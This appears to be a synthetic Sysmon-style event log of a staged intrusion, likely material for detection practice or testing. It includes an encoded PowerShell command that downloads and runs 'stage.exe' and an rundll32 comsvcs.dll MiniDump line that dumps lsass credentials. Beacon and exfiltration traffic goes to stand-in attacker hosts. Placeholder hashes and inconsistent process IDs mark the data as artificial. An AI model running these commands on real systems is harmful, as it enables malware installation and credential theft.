{"EventID": 1, "UtcTime": "2024-01-15T09:23:45.123Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0001-0001-0000-000000000001}", "ProcessId": 4532, "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_2024.docm\"", "CurrentDirectory": "C:\\Users\\jsmith\\Desktop", "IntegrityLevel": "Medium", "ParentProcessGuid": "{a1b2c3d4-0000-0001-0000-000000000000}", "ParentProcessId": 8924, "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE", "Hashes": "SHA256=ABC123DEF456...", "OriginalFileName": "WINWORD.EXE"}
{"EventID": 1, "UtcTime": "2024-01-15T09:23:47.456Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0002-0001-0000-000000000002}", "ProcessId": 7821, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAMQAyAC4AMgA1ADQALgAxADMANAAuADEAMAAwAC8AcwB0AGEAZwBlAC4AZQB4AGUAIgAsACAAIgBDADoAXABVAHMAZQByAHMAXABqAHMAbQBpAHQAaABcAEEAcABwAEQAYQB0AGEAXABMAbwBjAGEAbABcAFQAZQBtAHAAXABzAHQAYQBnAGUALgBlAHgAZQAiACkAOwAgAFMAcwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBDADoAXABVAHMAZQByAHMAXABqAHMAbQBpAHQAaABcAEEAcABwAEQAYQB0AGEAXABMAbwBjAGEAbABcAFQAZQBtAHAAXABzAHQAYQBnAGUALgBlAHgAZQAiAA==", "CurrentDirectory": "C:\\Users\\jsmith\\AppData\\Local\\Temp", "IntegrityLevel": "Medium", "ParentProcessGuid": "{a1b2c3d4-0001-0001-0000-000000000001}", "ParentProcessId": 4532, "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_2024.docm\"", "Hashes": "SHA256=DEF789GHI012...", "OriginalFileName": "powershell.exe"}
{"EventID": 3, "UtcTime": "2024-01-15T09:23:48.789Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0002-0001-0000-000000000002}", "ProcessId": 7821, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.105", "SourcePort": "49152", "DestinationIsIpv6": "false", "DestinationIp": "112.254.134.100", "DestinationPort": "80", "DestinationHostname": "malware-c2.evil.com", "User": "CORP\\jsmith"}
{"EventID": 11, "UtcTime": "2024-01-15T09:23:49.012Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0002-0001-0000-000000000002}", "ProcessId": 7821, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "CreationUtcDate": "2024-01-15T09:23:49.012Z", "Hashes": "SHA256=MALWARE123..."}
{"EventID": 1, "UtcTime": "2024-01-15T09:23:50.345Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ProcessId": 9234, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "CommandLine": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe --beacon", "CurrentDirectory": "C:\\Users\\jsmith\\AppData\\Local\\Temp", "IntegrityLevel": "Medium", "ParentProcessGuid": "{a1b2c3d4-0002-0001-0000-000000000002}", "ParentProcessId": 7821, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "powershell.exe -encodedcommand ...", "Hashes": "SHA256=MALWARE456...", "OriginalFileName": "stage.exe"}
{"EventID": 3, "UtcTime": "2024-01-15T09:23:51.678Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ProcessId": 9234, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.105", "SourcePort": "49153", "DestinationIsIpv6": "false", "DestinationIp": "112.254.134.100", "DestinationPort": "443", "DestinationHostname": "malware-c2.evil.com", "User": "CORP\\jsmith"}
{"EventID": 1, "UtcTime": "2024-01-15T09:25:12.901Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0004-0001-0000-000000000004}", "ProcessId": 1245, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "CommandLine": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe --module credential_dump", "CurrentDirectory": "C:\\Users\\jsmith\\AppData\\Local\\Temp", "IntegrityLevel": "High", "ParentProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ParentProcessId": 9234, "ParentImage": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "ParentCommandLine": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe --beacon", "Hashes": "SHA256=MALWARE456...", "OriginalFileName": "stage.exe"}
{"EventID": 10, "UtcTime": "2024-01-15T09:25:14.234Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0004-0001-0000-000000000004}", "ProcessId": 1245, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "TargetUser": "NT AUTHORITY\\SYSTEM", "TargetLogonId": "0x3e7", "TargetProcessId": 4, "TargetProcessName": "C:\\Windows\\System32\\lsass.exe", "NewProcessId": 8432, "NewProcessName": "C:\\Windows\\System32\\rundll32.exe", "TokenElevationType": "%%1937", "MandatoryLabel": "S-1-16-16384"}
{"EventID": 1, "UtcTime": "2024-01-15T09:25:15.567Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0005-0001-0000-000000000005}", "ProcessId": 8432, "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 648 lsass C:\\Users\\jsmith\\AppData\\Local\\Temp\\lsass.dmp full", "CurrentDirectory": "C:\\Windows\\System32", "IntegrityLevel": "High", "ParentProcessGuid": "{a1b2c3d4-0004-0001-0000-000000000004}", "ParentProcessId": 1245, "ParentImage": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "ParentCommandLine": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe --module credential_dump", "Hashes": "SHA256=SYSTEM789...", "OriginalFileName": "rundll32.exe"}
{"EventID": 11, "UtcTime": "2024-01-15T09:25:18.890Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0005-0001-0000-000000000005}", "ProcessId": 8432, "Image": "C:\\Windows\\System32\\rundll32.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\lsass.dmp", "CreationUtcDate": "2024-01-15T09:25:18.890Z"}
{"EventID": 3, "UtcTime": "2024-01-15T09:26:45.123Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ProcessId": 9234, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.105", "SourcePort": "49154", "DestinationIsIpv6": "false", "DestinationIp": "112.254.134.100", "DestinationPort": "443", "DestinationHostname": "malware-c2.evil.com", "User": "CORP\\jsmith", "BytesSent": "2458624", "BytesReceived": "1024"}
{"EventID": 3, "UtcTime": "2024-01-15T09:28:32.456Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ProcessId": 9234, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.105", "SourcePort": "49155", "DestinationIsIpv6": "false", "DestinationIp": "192.168.1.50", "DestinationPort": "445", "DestinationHostname": "FILESERVER-01", "User": "CORP\\jsmith"}
{"EventID": 3, "UtcTime": "2024-01-15T09:28:35.789Z", "Computer": "WORKSTATION-01", "User": "CORP\\jsmith", "ProcessGuid": "{a1b2c3d4-0003-0001-0000-000000000003}", "ProcessId": 9234, "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.105", "SourcePort": "49156", "DestinationIsIpv6": "false", "DestinationIp": "192.168.1.20", "DestinationPort": "445", "DestinationHostname": "SERVER-DC-01", "User": "CORP\\jsmith"}
{"EventID": 1, "UtcTime": "2024-01-15T09:30:12.012Z", "Computer": "FILESERVER-01", "User": "CORP\\jsmith", "ProcessGuid": "{b2c3d4e5-0001-0002-0000-000000000001}", "ProcessId": 5621, "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "CurrentDirectory": "C:\\Windows\\System32", "IntegrityLevel": "System", "ParentProcessGuid": "{b2c3d4e5-0000-0002-0000-000000000000}", "ParentProcessId": 612, "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=SVCHOST123...", "OriginalFileName": "svchost.exe"}
{"EventID": 3, "UtcTime": "2024-01-15T09:32:45.345Z", "Computer": "FILESERVER-01", "User": "CORP\\admin", "ProcessGuid": "{b2c3d4e5-0002-0002-0000-000000000002}", "ProcessId": 7823, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -Command Get-ChildItem \\\\\\\\WORKSTATION-01\\\\c$\\\\Users", "CurrentDirectory": "C:\\Windows\\System32", "IntegrityLevel": "High", "ParentProcessGuid": "{b2c3d4e5-0001-0002-0000-000000000001}", "ParentProcessId": 5621, "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "Hashes": "SHA256=DEF789GHI012...", "OriginalFileName": "powershell.exe"}
{"EventID": 3, "UtcTime": "2024-01-15T09:35:12.678Z", "Computer": "FILESERVER-01", "User": "CORP\\admin", "ProcessGuid": "{b2c3d4e5-0002-0002-0000-000000000002}", "ProcessId": 7823, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.1.50", "SourcePort": "49200", "DestinationIsIpv6": "false", "DestinationIp": "203.0.113.50", "DestinationPort": "443", "DestinationHostname": "exfil-server.attacker.com", "User": "CORP\\admin", "BytesSent": "15728640", "BytesReceived": "512"}